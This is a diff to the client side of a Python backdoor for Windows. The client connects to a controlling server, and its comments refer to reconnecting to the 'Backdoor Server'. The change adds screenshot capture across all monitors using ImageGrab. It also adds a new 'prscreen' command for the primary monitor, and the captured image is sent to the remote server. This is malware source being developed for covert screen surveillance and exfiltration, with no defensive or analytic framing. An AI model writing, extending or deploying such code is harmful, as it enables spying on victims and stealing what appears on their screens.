@@ -20,6 +20,7 @@ import threading
 from wmi import WMI
 import webbrowser
 import pyscreeze
+from PIL import ImageGrab
 
 
 import win32api
@@ -120,10 +121,22 @@ print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
 server_connect()
 
 # Step 27: Define `screenshot()` Function to Get Screenshot from Client
-def screenshot():
+# TODO: Implement Option choosing to get Screenshot:
+#   1. from All Monitors => --p
+#   2. from Primary Monitor => --p 1
+def screenshot(all_screens=True):
     # Take screenshot from Client
     screenshotPath = TMP + "/s.png"
-    pyscreeze.screenshot(screenshotPath)
+
+    # All monitors set
+    if all_screens:
+        screenshot = ImageGrab.grab(all_screens=True)
+        screenshot.save(screenshotPath)
+
+    # only take screenshot from Primary Monitor
+    else:
+        pyscreeze.screenshot(screenshotPath)
+
 
     # Send Byte Size of Screenshot and msg to Server
     send(str.encode(f"Receiving screenshot:\nFile Size: {str(path.getsize(screenshotPath))} bytes.\nPlease Wait..."))
@@ -168,6 +181,8 @@ while True:
                 
             elif strData == 'screen':
                 screenshot()
+            elif strData == 'prscreen':
+                screenshot(all_screens=False)
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
